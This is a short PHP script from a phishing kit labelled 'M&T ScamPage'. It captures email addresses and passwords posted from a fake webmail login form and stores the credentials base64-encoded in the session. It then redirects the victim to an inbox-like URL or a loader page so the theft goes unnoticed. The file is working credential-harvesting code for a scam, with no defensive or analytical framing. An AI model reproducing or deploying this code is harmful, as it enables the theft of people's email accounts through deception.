<?php
$login = $_POST['login'];
$passwd = $_POST['passwd'];
$Message = 'Result By M&T ScamPage {MailAccess Info}';
$Message .= 'E-Mail: '.$login;
$Message .= 'Password: '.$passwd;
$MailAccess = base64_encode($Message);
$_SESSION['MAC'] = $MailAccess;
if (isset($login)){
    header( "Location: index.php?email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
    
}if (isset($passwd)){
    header( "Location: index.php?email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}else {
header("Location: loader.php?email=$login");
}

?>
